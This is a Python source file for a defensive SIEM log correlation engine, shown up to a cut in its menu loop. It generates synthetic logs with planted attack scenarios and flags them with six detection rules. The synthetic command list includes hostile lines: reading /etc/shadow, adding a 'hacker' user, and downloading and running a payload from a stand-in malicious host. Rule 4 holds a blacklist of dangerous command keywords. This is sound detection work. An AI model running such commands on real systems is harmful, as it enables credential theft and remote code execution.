#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║          SIEM Log Correlation Engine  v1.0                      ║
║          Pure Python · No External Dependencies                  ║
╚══════════════════════════════════════════════════════════════════╝

A Security Information and Event Management (SIEM) simulation that
parses multi-source logs, applies correlation rules, scores risk,
and exports human-readable alerts.

Run:  python siem_log_correlation_engine.py
"""

import os
import sys
import json
import random
import logging
import textwrap
from datetime import datetime, timedelta
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Callable

# ─────────────────────────────────────────────────────────────────
#  Terminal colour helpers (no external libs)
# ─────────────────────────────────────────────────────────────────

class Color:
    """ANSI escape codes – gracefully degraded on Windows cmd."""
    _ENABLED = sys.platform != "win32" or "ANSICON" in os.environ

    RED     = "\033[91m" if _ENABLED else ""
    YELLOW  = "\033[93m" if _ENABLED else ""
    GREEN   = "\033[92m" if _ENABLED else ""
    CYAN    = "\033[96m" if _ENABLED else ""
    MAGENTA = "\033[95m" if _ENABLED else ""
    BLUE    = "\033[94m" if _ENABLED else ""
    BOLD    = "\033[1m"  if _ENABLED else ""
    DIM     = "\033[2m"  if _ENABLED else ""
    RESET   = "\033[0m"  if _ENABLED else ""

    @staticmethod
    def paint(text: str, *codes: str) -> str:
        return "".join(codes) + text + Color.RESET


def banner() -> None:
    print(Color.paint("""
╔══════════════════════════════════════════════════════════════════╗
║    ███████╗██╗███████╗███╗   ███╗                               ║
║    ██╔════╝██║██╔════╝████╗ ████║                               ║
║    ███████╗██║█████╗  ██╔████╔██║  Log Correlation Engine       ║
║    ╚════██║██║██╔══╝  ██║╚██╔╝██║  v1.0  ·  Pure Python        ║
║    ███████║██║███████╗██║ ╚═╝ ██║                               ║
║    ╚══════╝╚═╝╚══════╝╚═╝     ╚═╝                               ║
╚══════════════════════════════════════════════════════════════════╝
""", Color.CYAN, Color.BOLD))


# ─────────────────────────────────────────────────────────────────
#  Data Models
# ─────────────────────────────────────────────────────────────────

@dataclass
class LogEntry:
    """Normalised log entry shared across all log sources."""
    timestamp:  datetime
    source_ip:  str
    event_type: str          # e.g. AUTH_FAIL, HTTP_GET, SYS_CMD …
    source:     str          # auth | web | system
    message:    str
    extra:      Dict         = field(default_factory=dict)   # source-specific fields

    def __str__(self) -> str:
        ts = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
        return (f"[{ts}] [{self.source.upper():6s}] [{self.event_type:20s}] "
                f"{self.source_ip:15s}  {self.message}")


@dataclass
class Alert:
    """A security alert produced by a correlation rule."""
    alert_type:     str
    severity:       str          # LOW | MEDIUM | HIGH | CRITICAL
    risk_score:     int          # 0–100
    involved_ip:    str
    description:    str
    related_events: List[LogEntry] = field(default_factory=list)
    detected_at:    datetime       = field(default_factory=datetime.now)

    # Severity → colour map
    _SEV_COLOR = {
        "LOW":      Color.GREEN,
        "MEDIUM":   Color.YELLOW,
        "HIGH":     Color.RED,
        "CRITICAL": Color.MAGENTA,
    }

    def severity_colored(self) -> str:
        c = self._SEV_COLOR.get(self.severity, Color.RESET)
        return Color.paint(f"[{self.severity}]", c, Color.BOLD)

    def display(self) -> None:
        """Pretty-print an alert to the terminal."""
        width = 70
        sep   = Color.paint("─" * width, Color.DIM)
        print(sep)
        print(Color.paint(f"  ⚠  ALERT: {self.alert_type}", Color.BOLD, Color.RED))
        print(f"  Severity  : {self.severity_colored()}")
        print(f"  Risk Score: {Color.paint(str(self.risk_score) + '/100', Color.YELLOW, Color.BOLD)}")
        print(f"  Source IP : {Color.paint(self.involved_ip, Color.CYAN)}")
        print(f"  Detected  : {self.detected_at.strftime('%Y-%m-%d %H:%M:%S')}")
        # Word-wrap description
        desc_lines = textwrap.wrap(self.description, width - 14)
        print(f"  Description: {desc_lines[0]}")
        for line in desc_lines[1:]:
            print(f"               {line}")
        if self.related_events:
            print(Color.paint(f"\n  Related Events ({len(self.related_events)}):", Color.BOLD))
            # Show at most 5 to keep output readable
            for ev in self.related_events[:5]:
                print(f"    {Color.paint('▸', Color.BLUE)} {ev}")
            if len(self.related_events) > 5:
                print(f"    {Color.paint(f'  … and {len(self.related_events)-5} more event(s)', Color.DIM)}")
        print(sep)

    def to_text(self) -> str:
        """Serialize alert to a plain-text block for file export."""
        lines = [
            "=" * 68,
            f"ALERT      : {self.alert_type}",
            f"SEVERITY   : {self.severity}",
            f"RISK SCORE : {self.risk_score}/100",
            f"SOURCE IP  : {self.involved_ip}",
            f"DETECTED   : {self.detected_at.strftime('%Y-%m-%d %H:%M:%S')}",
            f"DESCRIPTION: {self.description}",
            f"EVENTS ({len(self.related_events)}):",
        ]
        for ev in self.related_events[:10]:
            lines.append(f"  > {ev}")
        lines.append("=" * 68)
        return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────
#  Log Generator  (synthetic data for demo / testing)
# ─────────────────────────────────────────────────────────────────

class LogGenerator:
    """
    Generates realistic synthetic logs for:
      • Authentication events
      • Web-server (HTTP) access logs
      • System / OS command logs

    Includes planted attack patterns so the correlation engine
    has something meaningful to detect.
    """

    # Realistic-looking public IPs
    ATTACKER_IPS   = ["198.51.100.7", "203.0.113.42", "192.0.2.99"]
    LEGITIMATE_IPS = [
        "10.0.0.101", "10.0.0.102", "10.0.0.103",
        "172.16.0.5",  "172.16.0.6",
    ]
    USERNAMES      = ["admin", "root", "alice", "bob", "sysop", "test"]
    SENSITIVE_URLS = ["/admin", "/admin/login", "/.env", "/wp-admin",
                      "/phpmyadmin", "/config", "/backup"]
    NORMAL_URLS    = ["/", "/index.html", "/about", "/contact",
                      "/api/v1/products", "/login", "/dashboard"]
    SYS_COMMANDS   = [
        "sudo cat /etc/shadow", "sudo useradd -m hacker",
        "wget http://malicious.example.com/payload.sh",
        "crontab -e", "chmod +x payload.sh", "./payload.sh",
        "systemctl status sshd", "ls /var/log",
        "df -h", "top", "ps aux",
    ]

    def __init__(self, base_time: Optional[datetime] = None):
        self.base_time = base_time or datetime.now() - timedelta(hours=1)
        self._entries: List[LogEntry] = []

    # ── helpers ──────────────────────────────────────────────────

    def _ts(self, offset_seconds: float) -> datetime:
        return self.base_time + timedelta(seconds=offset_seconds)

    def _rand_ip(self) -> str:
        return random.choice(self.LEGITIMATE_IPS)

    def _rand_attacker(self) -> str:
        return random.choice(self.ATTACKER_IPS)

    # ── scenario builders ─────────────────────────────────────────

    def _gen_normal_auth(self, count: int = 40) -> None:
        """Random successful logins from legitimate IPs."""
        for _ in range(count):
            ts  = self._ts(random.uniform(0, 3000))
            ip  = self._rand_ip()
            usr = random.choice(self.USERNAMES)
            self._entries.append(LogEntry(
                timestamp=ts, source_ip=ip,
                event_type="AUTH_SUCCESS", source="auth",
                message=f"Successful login for user '{usr}'",
                extra={"user": usr},
            ))

    def _gen_brute_force(self, attacker_ip: str, offset: float = 300.0) -> None:
        """
        Plant a brute-force pattern:
          N failed logins in rapid succession → one success.
        """
        n_fails = random.randint(8, 15)
        for i in range(n_fails):
            ts  = self._ts(offset + i * 4)     # ~4 s between attempts
            usr = random.choice(["admin", "root"])
            self._entries.append(LogEntry(
                timestamp=ts, source_ip=attacker_ip,
                event_type="AUTH_FAIL", source="auth",
                message=f"Failed login attempt for user '{usr}' (attempt {i+1})",
                extra={"user": usr},
            ))
        # Final success
        self._entries.append(LogEntry(
            timestamp=self._ts(offset + n_fails * 4 + 2),
            source_ip=attacker_ip,
            event_type="AUTH_SUCCESS", source="auth",
            message=f"Successful login for user 'admin' after {n_fails} failures",
            extra={"user": "admin"},
        ))

    def _gen_port_scan(self, attacker_ip: str, offset: float = 900.0) -> None:
        """High-frequency HTTP requests simulating a scanner / crawler."""
        for i in range(random.randint(60, 80)):
            ts  = self._ts(offset + i * 1.2)   # very fast requests
            url = random.choice(self.NORMAL_URLS + self.SENSITIVE_URLS)
            self._entries.append(LogEntry(
                timestamp=ts, source_ip=attacker_ip,
                event_type="HTTP_GET", source="web",
                message=f"GET {url} HTTP/1.1 – 200",
                extra={"url": url, "method": "GET", "status": 200},
            ))

    def _gen_sensitive_access(self, attacker_ip: str, offset: float = 600.0) -> None:
        """Access to sensitive URLs after authentication."""
        for i, url in enumerate(self.SENSITIVE_URLS):
            ts = self._ts(offset + i * 15)
            self._entries.append(LogEntry(
                timestamp=ts, source_ip=attacker_ip,
                event_type="HTTP_GET", source="web",
                message=f"GET {url} HTTP/1.1 – 403",
                extra={"url": url, "method": "GET", "status": 403},
            ))

    def _gen_normal_web(self, count: int = 60) -> None:
        """Background web traffic from legitimate users."""
        for _ in range(count):
            ts  = self._ts(random.uniform(0, 3500))
            ip  = self._rand_ip()
            url = random.choice(self.NORMAL_URLS)
            st  = random.choice([200, 200, 200, 301, 404])
            self._entries.append(LogEntry(
                timestamp=ts, source_ip=ip,
                event_type="HTTP_GET", source="web",
                message=f"GET {url} HTTP/1.1 – {st}",
                extra={"url": url, "method": "GET", "status": st},
            ))

    def _gen_post_intrusion_cmds(self, attacker_ip: str, offset: float = 1200.0) -> None:
        """Suspicious system commands executed after brute-force success."""
        suspicious = [c for c in self.SYS_COMMANDS
                      if any(k in c for k in ["shadow", "useradd", "wget", "payload"])]
        for i, cmd in enumerate(suspicious):
            ts = self._ts(offset + i * 30)
            self._entries.append(LogEntry(
                timestamp=ts, source_ip=attacker_ip,
                event_type="SYS_CMD", source="system",
                message=f"Command executed: {cmd}",
                extra={"command": cmd},
            ))

    def _gen_normal_sys(self, count: int = 30) -> None:
        """Benign system activity."""
        benign = [c for c in self.SYS_COMMANDS
                  if not any(k in c for k in ["shadow", "useradd", "wget", "payload"])]
        for _ in range(count):
            ts  = self._ts(random.uniform(0, 3500))
            ip  = self._rand_ip()
            cmd = random.choice(benign)
            self._entries.append(LogEntry(
                timestamp=ts, source_ip=ip,
                event_type="SYS_CMD", source="system",
                message=f"Command executed: {cmd}",
                extra={"command": cmd},
            ))

    def _gen_repeated_404(self, attacker_ip: str, offset: float = 2000.0) -> None:
        """Directory enumeration: many 404s in a short window."""
        paths = ["/secret", "/backup.zip", "/.git/config", "/db.sqlite",
                 "/passwords.txt", "/id_rsa", "/server.key", "/.htpasswd"]
        for i, p in enumerate(paths):
            ts = self._ts(offset + i * 8)
            self._entries.append(LogEntry(
                timestamp=ts, source_ip=attacker_ip,
                event_type="HTTP_GET", source="web",
                message=f"GET {p} HTTP/1.1 – 404",
                extra={"url": p, "method": "GET", "status": 404},
            ))

    # ── public API ────────────────────────────────────────────────

    def generate(self) -> List[LogEntry]:
        """Build and return a complete synthetic log set."""
        random.seed(42)           # reproducible demo data
        attacker = self._rand_attacker()

        # Legitimate background noise
        self._gen_normal_auth()
        self._gen_normal_web()
        self._gen_normal_sys()

        # Planted attack scenarios
        self._gen_brute_force(attacker,           offset=300.0)
        self._gen_sensitive_access(attacker,      offset=600.0)
        self._gen_port_scan(attacker,             offset=900.0)
        self._gen_post_intrusion_cmds(attacker,   offset=1200.0)
        self._gen_repeated_404(attacker,          offset=2000.0)

        # A second attacker doing only scanning
        second = self.ATTACKER_IPS[1]
        self._gen_port_scan(second, offset=2400.0)

        # Sort chronologically
        self._entries.sort(key=lambda e: e.timestamp)
        return self._entries


# ─────────────────────────────────────────────────────────────────
#  Log Parser  (plain-text ↔ LogEntry round-trip)
# ─────────────────────────────────────────────────────────────────

class LogParser:
    """
    Parses plain-text log lines exported by this engine back into
    LogEntry objects.  Format (tab-separated fields):
        <ISO-timestamp>\t<ip>\t<event_type>\t<source>\t<message>\t<json-extra>
    """

    @staticmethod
    def parse_line(line: str) -> Optional[LogEntry]:
        line = line.strip()
        if not line or line.startswith("#"):
            return None
        parts = line.split("\t")
        if len(parts) < 5:
            return None
        try:
            ts_str, ip, event_type, source, message = parts[:5]
            extra_raw = parts[5] if len(parts) > 5 else "{}"
            extra = json.loads(extra_raw)
            ts    = datetime.fromisoformat(ts_str)
            return LogEntry(
                timestamp=ts, source_ip=ip,
                event_type=event_type, source=source,
                message=message, extra=extra,
            )
        except (ValueError, json.JSONDecodeError):
            return None

    @staticmethod
    def parse_file(path: str) -> List[LogEntry]:
        """Read a file of tab-separated log lines; skip malformed rows."""
        entries: List[LogEntry] = []
        try:
            with open(path, "r", encoding="utf-8") as fh:
                for raw in fh:
                    entry = LogParser.parse_line(raw)
                    if entry:
                        entries.append(entry)
        except FileNotFoundError:
            print(Color.paint(f"  [!] File not found: {path}", Color.RED))
        except OSError as exc:
            print(Color.paint(f"  [!] OS error reading {path}: {exc}", Color.RED))
        return entries

    @staticmethod
    def serialize_entry(entry: LogEntry) -> str:
        """Serialize a LogEntry to its TSV representation."""
        return "\t".join([
            entry.timestamp.isoformat(),
            entry.source_ip,
            entry.event_type,
            entry.source,
            entry.message,
            json.dumps(entry.extra),
        ])

    @staticmethod
    def save_to_file(entries: List[LogEntry], path: str) -> None:
        with open(path, "w", encoding="utf-8") as fh:
            fh.write("# SIEM Log File  –  generated by siem_log_correlation_engine.py\n")
            for entry in entries:
                fh.write(LogParser.serialize_entry(entry) + "\n")


# ─────────────────────────────────────────────────────────────────
#  Correlation Rules
# ─────────────────────────────────────────────────────────────────

# A rule is any callable: (List[LogEntry]) -> List[Alert]
RuleFunc = Callable[[List[LogEntry]], List[Alert]]


def _events_in_window(
    events: List[LogEntry],
    anchor: datetime,
    window_seconds: int,
    direction: str = "before",
) -> List[LogEntry]:
    """Return events within *window_seconds* of *anchor*."""
    delta = timedelta(seconds=window_seconds)
    if direction == "before":
        return [e for e in events
                if anchor - delta <= e.timestamp <= anchor]
    if direction == "after":
        return [e for e in events
                if anchor <= e.timestamp <= anchor + delta]
    # both
    return [e for e in events
            if anchor - delta <= e.timestamp <= anchor + delta]


# ── Rule 1: Brute-force detection ────────────────────────────────

def rule_brute_force(entries: List[LogEntry]) -> List[Alert]:
    """
    TRIGGER: ≥ 5 AUTH_FAIL events from the same IP within a 5-minute
             window, followed by an AUTH_SUCCESS within 2 minutes.
    """
    alerts: List[Alert] = []
    FAIL_THRESHOLD  = 5
    WINDOW_FAIL_S   = 300   # 5 min
    WINDOW_SUCCESS_S = 120  # 2 min after last failure

    auth_by_ip: Dict[str, List[LogEntry]] = defaultdict(list)
    for e in entries:
        if e.source == "auth":
            auth_by_ip[e.source_ip].append(e)

    for ip, evts in auth_by_ip.items():
        evts.sort(key=lambda x: x.timestamp)
        fails    = [e for e in evts if e.event_type == "AUTH_FAIL"]
        successes = [e for e in evts if e.event_type == "AUTH_SUCCESS"]

        # Sliding-window over failures
        for i in range(len(fails)):
            window_end   = fails[i].timestamp + timedelta(seconds=WINDOW_FAIL_S)
            window_fails = [f for f in fails
                            if fails[i].timestamp <= f.timestamp <= window_end]
            if len(window_fails) < FAIL_THRESHOLD:
                continue

            last_fail = max(window_fails, key=lambda x: x.timestamp)
            # Check for success shortly after
            post_success = [s for s in successes
                            if last_fail.timestamp < s.timestamp
                            <= last_fail.timestamp + timedelta(seconds=WINDOW_SUCCESS_S)]

            if post_success:
                n     = len(window_fails)
                score = min(100, 50 + n * 3)
                sev   = "CRITICAL" if score >= 80 else "HIGH"
                alerts.append(Alert(
                    alert_type="BRUTE_FORCE_SUCCESS",
                    severity=sev,
                    risk_score=score,
                    involved_ip=ip,
                    description=(
                        f"{n} failed login attempt(s) from {ip} within "
                        f"{WINDOW_FAIL_S//60} minutes, followed by a successful "
                        f"authentication – possible credential brute-force attack."
                    ),
                    related_events=window_fails + post_success,
                    detected_at=post_success[0].timestamp,
                ))
                break   # one alert per IP per run

    return alerts


# ── Rule 2: Sensitive URL access after authentication ─────────────

def rule_sensitive_url_post_auth(entries: List[LogEntry]) -> List[Alert]:
    """
    TRIGGER: AUTH_SUCCESS for an IP, followed within 10 minutes by
             HTTP_GET to a sensitive URL (e.g. /admin, /.env …).
    """
    alerts: List[Alert] = []
    WINDOW_S = 600   # 10 min
    SENSITIVE = {"/admin", "/admin/login", "/.env", "/wp-admin",
                 "/phpmyadmin", "/config", "/backup", "/.git", "/.htpasswd"}

    auth_success: Dict[str, List[LogEntry]] = defaultdict(list)
    for e in entries:
        if e.source == "auth" and e.event_type == "AUTH_SUCCESS":
            auth_success[e.source_ip].append(e)

    web_by_ip: Dict[str, List[LogEntry]] = defaultdict(list)
    for e in entries:
        if e.source == "web":
            web_by_ip[e.source_ip].append(e)

    for ip, logins in auth_success.items():
        for login in logins:
            cutoff = login.timestamp + timedelta(seconds=WINDOW_S)
            hits   = [
                e for e in web_by_ip.get(ip, [])
                if login.timestamp < e.timestamp <= cutoff
                and any(e.extra.get("url", "").startswith(s) for s in SENSITIVE)
            ]
            if hits:
                alerts.append(Alert(
                    alert_type="SENSITIVE_URL_POST_AUTH",
                    severity="HIGH",
                    risk_score=70,
                    involved_ip=ip,
                    description=(
                        f"{ip} accessed {len(hits)} sensitive URL(s) "
                        f"within {WINDOW_S//60} minutes after successful login – "
                        f"possible post-authentication reconnaissance."
                    ),
                    related_events=[login] + hits,
                    detected_at=hits[0].timestamp,
                ))

    return alerts


# ── Rule 3: High-frequency HTTP requests (scan / DDoS) ───────────

def rule_http_flood(entries: List[LogEntry]) -> List[Alert]:
    """
    TRIGGER: ≥ 50 HTTP requests from one IP within a 2-minute window.
    """
    alerts: List[Alert] = []
    THRESHOLD = 50
    WINDOW_S  = 120   # 2 min

    web_by_ip: Dict[str, List[LogEntry]] = defaultdict(list)
    for e in entries:
        if e.source == "web":
            web_by_ip[e.source_ip].append(e)

    for ip, evts in web_by_ip.items():
        evts.sort(key=lambda x: x.timestamp)
        alerted = False
        for i in range(len(evts)):
            if alerted:
                break
            window_end = evts[i].timestamp + timedelta(seconds=WINDOW_S)
            window     = [e for e in evts
                          if evts[i].timestamp <= e.timestamp <= window_end]
            if len(window) >= THRESHOLD:
                rate  = len(window) / WINDOW_S * 60
                score = min(100, 40 + int(rate))
                sev   = "CRITICAL" if score >= 85 else ("HIGH" if score >= 60 else "MEDIUM")
                alerts.append(Alert(
                    alert_type="HTTP_FLOOD_SCAN",
                    severity=sev,
                    risk_score=score,
                    involved_ip=ip,
                    description=(
                        f"{len(window)} HTTP request(s) from {ip} in "
                        f"{WINDOW_S} seconds (~{rate:.1f} req/min) – "
                        f"possible port/directory scan or DoS attempt."
                    ),
                    related_events=window[:20],   # cap for readability
                    detected_at=evts[i].timestamp,
                ))
                alerted = True

    return alerts


# ── Rule 4: Suspicious system commands ───────────────────────────

def rule_suspicious_commands(entries: List[LogEntry]) -> List[Alert]:
    """
    TRIGGER: SYS_CMD events matching a blacklist of dangerous commands.
    """
    alerts: List[Alert] = []
    BLACKLIST = [
        "shadow", "useradd", "payload", "malicious",
        "id_rsa", "chmod +x", "crontab -e",
    ]

    sus_by_ip: Dict[str, List[LogEntry]] = defaultdict(list)
    for e in entries:
        if e.source == "system" and e.event_type == "SYS_CMD":
            cmd = e.extra.get("command", e.message)
            if any(kw in cmd for kw in BLACKLIST):
                sus_by_ip[e.source_ip].append(e)

    for ip, evts in sus_by_ip.items():
        score = min(100, 55 + len(evts) * 5)
        sev   = "CRITICAL" if score >= 90 else "HIGH"
        alerts.append(Alert(
            alert_type="SUSPICIOUS_SYS_COMMANDS",
            severity=sev,
            risk_score=score,
            involved_ip=ip,
            description=(
                f"{len(evts)} suspicious system command(s) executed from {ip} – "
                f"potential post-exploitation / privilege escalation activity."
            ),
            related_events=evts,
            detected_at=evts[0].timestamp,
        ))

    return alerts


# ── Rule 5: Directory enumeration (repeated 404s) ────────────────

def rule_directory_enumeration(entries: List[LogEntry]) -> List[Alert]:
    """
    TRIGGER: ≥ 5 HTTP 404 responses for an IP within 5 minutes.
    """
    alerts: List[Alert] = []
    THRESHOLD = 5
    WINDOW_S  = 300

    web_by_ip: Dict[str, List[LogEntry]] = defaultdict(list)
    for e in entries:
        if e.source == "web" and e.extra.get("status") == 404:
            web_by_ip[e.source_ip].append(e)

    for ip, evts in web_by_ip.items():
        evts.sort(key=lambda x: x.timestamp)
        alerted = False
        for i in range(len(evts)):
            if alerted:
                break
            window_end = evts[i].timestamp + timedelta(seconds=WINDOW_S)
            window     = [e for e in evts
                          if evts[i].timestamp <= e.timestamp <= window_end]
            if len(window) >= THRESHOLD:
                alerts.append(Alert(
                    alert_type="DIRECTORY_ENUMERATION",
                    severity="MEDIUM",
                    risk_score=45 + len(window),
                    involved_ip=ip,
                    description=(
                        f"{len(window)} HTTP 404 error(s) from {ip} within "
                        f"{WINDOW_S//60} minutes – possible directory enumeration."
                    ),
                    related_events=window,
                    detected_at=evts[i].timestamp,
                ))
                alerted = True

    return alerts


# ── Rule 6: Auth failures without any success (failed intrusion) ─

def rule_failed_auth_storm(entries: List[LogEntry]) -> List[Alert]:
    """
    TRIGGER: ≥ 10 AUTH_FAIL from an IP with no AUTH_SUCCESS at all.
    """
    alerts: List[Alert] = []
    THRESHOLD = 10

    by_ip: Dict[str, Dict[str, List[LogEntry]]] = defaultdict(lambda: defaultdict(list))
    for e in entries:
        if e.source == "auth":
            by_ip[e.source_ip][e.event_type].append(e)

    for ip, evts in by_ip.items():
        fails    = evts.get("AUTH_FAIL",    [])
        successes = evts.get("AUTH_SUCCESS", [])
        if len(fails) >= THRESHOLD and not successes:
            score = min(100, 40 + len(fails) * 2)
            sev   = "HIGH" if score >= 60 else "MEDIUM"
            alerts.append(Alert(
                alert_type="AUTH_FAILURE_STORM",
                severity=sev,
                risk_score=score,
                involved_ip=ip,
                description=(
                    f"{len(fails)} authentication failure(s) from {ip} with no "
                    f"successful login – likely credential stuffing or brute-force."
                ),
                related_events=fails[:10],
                detected_at=fails[0].timestamp,
            ))

    return alerts


# ─────────────────────────────────────────────────────────────────
#  Correlation Engine
# ─────────────────────────────────────────────────────────────────

class CorrelationEngine:
    """
    Applies a registry of rule functions to a log corpus and
    collects the resulting alerts.

    Adding a new rule:  engine.register_rule(my_rule_function)
    """

    def __init__(self) -> None:
        self._rules: List[RuleFunc] = []
        self._alerts: List[Alert]   = []
        # Wire up file-level logging for incident records
        logging.basicConfig(
            filename="siem_incidents.log",
            level=logging.INFO,
            format="%(asctime)s  %(levelname)-8s  %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S",
        )

    def register_rule(self, rule: RuleFunc) -> None:
        self._rules.append(rule)

    def analyse(self, entries: List[LogEntry]) -> List[Alert]:
        """Run all rules; deduplicate; sort by risk score."""
        self._alerts = []
        if not entries:
            print(Color.paint("  [!] No log entries to analyse.", Color.YELLOW))
            return []

        print(Color.paint(
            f"\n  Running {len(self._rules)} rule(s) "
            f"against {len(entries):,} log entry(ies) …",
            Color.CYAN,
        ))

        for rule in self._rules:
            rule_name = rule.__name__
            try:
                found = rule(entries)
                self._alerts.extend(found)
                status = (
                    Color.paint(f"  ✔ {rule_name:40s} → {len(found)} alert(s)", Color.GREEN)
                    if found
                    else Color.paint(f"  · {rule_name:40s} → no alerts",         Color.DIM)
                )
                print(status)
            except Exception as exc:          # never let one rule crash all analysis
                print(Color.paint(f"  ✗ {rule_name}: ERROR – {exc}", Color.RED))

        # Deduplicate (same type + IP)
        seen: set = set()
        unique: List[Alert] = []
        for a in self._alerts:
            key = (a.alert_type, a.involved_ip)
            if key not in seen:
                seen.add(key)
                unique.append(a)

        unique.sort(key=lambda x: x.risk_score, reverse=True)
        self._alerts = unique

        # Log to file
        for alert in self._alerts:
            logging.warning(
                "ALERT  type=%-30s  ip=%-18s  severity=%-8s  score=%d/100",
                alert.alert_type, alert.involved_ip,
                alert.severity, alert.risk_score,
            )

        return self._alerts

    def display_alerts(self) -> None:
        if not self._alerts:
            print(Color.paint("\n  ✔ No alerts detected – system appears clean.\n",
                              Color.GREEN, Color.BOLD))
            return

        print(Color.paint(
            f"\n{'═'*70}\n"
            f"  ANALYSIS COMPLETE  –  {len(self._alerts)} ALERT(S) DETECTED\n"
            f"{'═'*70}", Color.RED, Color.BOLD,
        ))
        for alert in self._alerts:
            alert.display()

        # Summary table
        print(Color.paint("\n  ── Risk Summary ──────────────────────────────────────", Color.BOLD))
        sev_order = ["CRITICAL", "HIGH", "MEDIUM", "LOW"]
        counts = defaultdict(int)
        for a in self._alerts:
            counts[a.severity] += 1
        for sev in sev_order:
            if counts[sev]:
                c = Alert._SEV_COLOR.get(sev, "")
                bar = "█" * counts[sev]
                print(f"  {Color.paint(f'{sev:8s}', c, Color.BOLD)}  {bar}  ({counts[sev]})")
        total_score = sum(a.risk_score for a in self._alerts)
        avg_score   = total_score / len(self._alerts) if self._alerts else 0
        print(f"\n  Avg Risk Score : {Color.paint(f'{avg_score:.1f}/100', Color.YELLOW, Color.BOLD)}")
        print(f"  Total Alerts   : {Color.paint(str(len(self._alerts)), Color.BOLD)}")
        print()

    def export_alerts(self, path: str = "alerts.txt") -> None:
        """Write all alerts to a plain-text file."""
        if not self._alerts:
            print(Color.paint("  [i] No alerts to export.", Color.YELLOW))
            return
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(f"SIEM ALERT EXPORT  –  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            fh.write(f"Total alerts: {len(self._alerts)}\n\n")
            for alert in self._alerts:
                fh.write(alert.to_text() + "\n\n")
        print(Color.paint(f"  [✔] Alerts exported → {path}", Color.GREEN))

    @property
    def alerts(self) -> List[Alert]:
        return list(self._alerts)


# ─────────────────────────────────────────────────────────────────
#  CLI Menu
# ─────────────────────────────────────────────────────────────────

class CLI:
    """Interactive command-line interface for the SIEM engine."""

    MENU = """
  ┌─────────────────────────────────────────┐
  │   {cyan}SIEM Log Correlation Engine{reset}            │
  ├─────────────────────────────────────────┤
  │  {bold}1{reset}  Generate synthetic logs               │
  │  {bold}2{reset}  Load logs from file                   │
  │  {bold}3{reset}  Show loaded log statistics            │
  │  {bold}4{reset}  Run correlation analysis              │
  │  {bold}5{reset}  Show / re-display alerts              │
  │  {bold}6{reset}  Export alerts to alerts.txt           │
  │  {bold}7{reset}  Save logs to file                     │
  │  {bold}8{reset}  List registered rules                 │
  │  {bold}9{reset}  Clear loaded data                     │
  │  {bold}0{reset}  Exit                                  │
  └─────────────────────────────────────────┘
"""

    def __init__(self) -> None:
        self._entries: List[LogEntry]  = []
        self._engine  = CorrelationEngine()
        self._register_default_rules()

    # ── rule registration ─────────────────────────────────────────

    def _register_default_rules(self) -> None:
        for rule in [
            rule_brute_force,
            rule_sensitive_url_post_auth,
            rule_http_flood,
            rule_suspicious_commands,
            rule_directory_enumeration,
            rule_failed_auth_storm,
        ]:
            self._engine.register_rule(rule)

    # ── menu actions ──────────────────────────────────────────────

    def _action_generate(self) -> None:
        print(Color.paint("\n  Generating synthetic log data …", Color.CYAN))
        gen = LogGenerator()
        self._entries = gen.generate()
        print(Color.paint(
            f"  [✔] Generated {len(self._entries):,} log entries "
            f"(auth / web / system).", Color.GREEN,
        ))

    def _action_load_file(self) -> None:
        path = input(Color.paint("  Enter log file path: ", Color.CYAN)).strip()
        if not path:
            print(Color.paint("  [!] No path given.", Color.YELLOW))
            return
        new_entries = LogParser.parse_file(path)
        if not new_entries:
            print(Color.paint("  [!] No valid entries found in file.", Color.YELLOW))
            return
        self._entries.extend(new_entries)
        print(Color.paint(
            f"  [✔] Loaded {len(new_entries):,} entries "
            f"(total: {len(self._entries):,}).", Color.GREEN,
        ))

    def _action_stats(self) -> None:
        if not self._entries:
            print(Color.paint("  [!] No logs loaded.", Color.YELLOW))
            return
        by_src: Dict[str, int]   = defaultdict(int)
        by_type: Dict[str, int]  = defaultdict(int)
        by_ip: Dict[str, int]    = defaultdict(int)
        for e in self._entries:
            by_src[e.source]     += 1
            by_type[e.event_type] += 1
            by_ip[e.source_ip]   += 1

        times = sorted(e.timestamp for e in self._entries)
        span  = (times[-1] - times[0]).total_seconds() / 60

        print(Color.paint("\n  ── Log Statistics ────────────────────────────────────", Color.BOLD))
        print(f"  Total entries : {len(self._entries):,}")
        print(f"  Time span     : {span:.1f} minutes")
        print(f"  Unique IPs    : {len(by_ip)}")
        print(Color.paint("\n  By Source:", Color.BOLD))
        for src, cnt in sorted(by_src.items()):
            print(f"    {src:10s}  {cnt:,}")
        print(Color.paint("\n  By Event Type:", Color.BOLD))
        for etype, cnt in sorted(by_type.items(), key=lambda x: -x[1])[:10]:
            print(f"    {etype:22s}  {cnt:,}")
        print(Color.paint("\n  Top 5 Source IPs:", Color.BOLD))
        for ip, cnt in sorted(by_ip.items(), key=lambda x: -x[1])[:5]:
            print(f"    {ip:18s}  {cnt:,}")
        print()

    def _action_analyse(self) -> None:
        if not self._entries:
            print(Color.paint("  [!] Load or generate logs first.", Color.YELLOW))
            return
        self._engine.analyse(self._entries)
        self._engine.display_alerts()

    def _action_show_alerts(self) -> None:
        if not self._engine.alerts:
            print(Color.paint("  [!] No alerts available. Run analysis first.", Color.YELLOW))
            return
        self._engine.display_alerts()

    def _action_export(self) -> None:
        self._engine.export_alerts()

    def _action_save_logs(self) -> None:
        if not self._entries:
            print(Color.paint("  [!] No logs to save.", Color.YELLOW))
            return
        path = input(
            Color.paint("  Output file path [logs.tsv]: ", Color.CYAN)
        ).strip() or "logs.tsv"
        LogParser.save_to_file(self._entries, path)
        print(Color.paint(f"  [✔] Saved {len(self._entries):,} entries → {path}", Color.GREEN))

    def _action_list_rules(self) -> None:
        rules = self._engine._rules
        print(Color.paint(f"\n  Registered rules ({len(rules)}):", Color.BOLD))
        for i, r in enumerate(rules, 1):
            doc = (r.__doc__ or "").strip().splitlines()[0] if r.__doc__ else ""
            print(f"  {i:2d}. {Color.paint(r.__name__, Color.CYAN):45s}  {Color.paint(doc, Color.DIM)}")
        print()

    def _action_clear(self) -> None:
        self._entries = []
        self._engine._alerts = []
        print(Color.paint("  [✔] Cleared all loaded data.", Color.GREEN))

    # ── main loop ─────────────────────────────────────────────────

    def run(self) -> None:
        banner()
        ACTIONS = {
            "1": self._action_generate,
            "2": self._action_load_file,
